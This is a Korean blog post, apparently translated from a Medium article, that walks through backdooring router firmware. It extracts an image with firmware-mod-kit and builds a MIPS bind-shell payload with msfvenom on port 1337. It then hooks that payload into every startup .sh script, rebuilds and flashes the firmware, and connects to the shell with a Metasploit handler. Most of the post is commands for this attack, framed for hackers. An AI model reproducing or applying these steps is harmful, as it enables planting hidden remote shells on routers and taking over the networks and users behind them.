---
title: "라우터 펌웨어 역공학 및 백도어 설치 방법"
description: ""
coverImage: "/assets/img/2024-07-06-ReverseRouterFirmwareBackdooringIt_0.png"
date: 2024-07-06 02:52
ogImage: 
  url: /assets/img/2024-07-06-ReverseRouterFirmwareBackdooringIt_0.png
tag: Tech
originalTitle: "Reverse Router Firmware , Backdooring It…"
link: "https://medium.com/@nahid0x1/reverse-router-firmware-backdooring-it-78ff442edb6c"
---


라우터 펌웨어는 네트워크 인프라의 중요한 구성 요소이며 보안이 자주 간과됩니다. 해커로서 라우터 펌웨어를 역공학 및 백도어링하는 방법을 이해하는 것이 중요합니다. 이 문서에서는 라우터 펌웨어를 역공학하고 백도어링하는 과정을 살펴보겠습니다.

![라우터 펌웨어 역공학 및 백도어링](/assets/img/2024-07-06-ReverseRouterFirmwareBackdooringIt_0.png)

도구 및 요구 사항

- 리눅스 머신 (Kali Linux)
- Binwalk: 펌웨어 분석 도구
- Firmware-Mod-Kit (github.com/rampageX/firmware-mod-kit)

<div class="content-ad"></div>

단계 1: 대상 라우터 펌웨어 다운로드하기

![이미지](/assets/img/2024-07-06-ReverseRouterFirmwareBackdooringIt_1.png)

단계 2: 압축 해제하기

![이미지](/assets/img/2024-07-06-ReverseRouterFirmwareBackdooringIt_2.png)

<div class="content-ad"></div>

Step 3: Firmware-mod-kit 다운로드하기

![이미지](/assets/img/2024-07-06-ReverseRouterFirmwareBackdooringIt_3.png)

```bash
git clone https://github.com/rampageX/firmware-mod-kit

sudo apt-get install git build-essential zlib1g-dev liblzma-dev python3-magic autoconf python-is-python3
```

![이미지](/assets/img/2024-07-06-ReverseRouterFirmwareBackdooringIt_4.png)

<div class="content-ad"></div>

단계 4: 펌웨어 추출하기

/assets/img/2024-07-06-ReverseRouterFirmwareBackdooringIt_5.png

```js
firmware-mod-kit/extract-firmware.sh firmware.bin
```

단계 5: rootfs 폴더로 이동하기

<div class="content-ad"></div>

/assets/img/2024-07-06-ReverseRouterFirmwareBackdooringIt_6.png

단계 6: Metasploit을 사용하여 백도어(backdoor) 생성하기

참고: 먼저 펌웨어 엔디안이 리틀 엔디안(little endian)인지 다른 종류의 엔디안인지 확인하십시오.

/assets/img/2024-07-06-ReverseRouterFirmwareBackdooringIt_7.png

<div class="content-ad"></div>


```js
cd bin
msfvenom -p linux/mipsle/shell_bind_tcp LPORT=1337 -f elf > backdoor
chmod 777 backdoor
```

Step 7: 백도어를 실행하도록 설정합니다.

/assets/img/2024-07-06-ReverseRouterFirmwareBackdooringIt_8.png

```js
cd ...
find . -name "*.sh" #이 명령어는 모든 .sh 파일을 검색합니다
#찾은 .sh 파일에 "/bin/backdoor &"를 추가하세요
```


<div class="content-ad"></div>

8단계: 펌웨어를 다시 빌드하세요

/assets/img/2024-07-06-ReverseRouterFirmwareBackdooringIt_9.png

```js
firmware-mod-kit/build-firmware.sh
```

9단계: 펌웨어 업로드

<div class="content-ad"></div>

- 관리자 패널에 로그인하세요.
- 업데이트 옵션을 찾으세요.

![이미지](/assets/img/2024-07-06-ReverseRouterFirmwareBackdooringIt_10.png)

- 이제 수정된 펌웨어를 업로드하세요...

단계 9: 라우터 쉘에 액세스하기

<div class="content-ad"></div>

```js
msfconsole
use exploit/multi/handler
set payload linux/mipsle/shell_bind_tcp
set LPORT 1337
set rhost 192.168.0.1
exploit
```

/assets/img/2024-07-06-ReverseRouterFirmwareBackdooringIt_11.png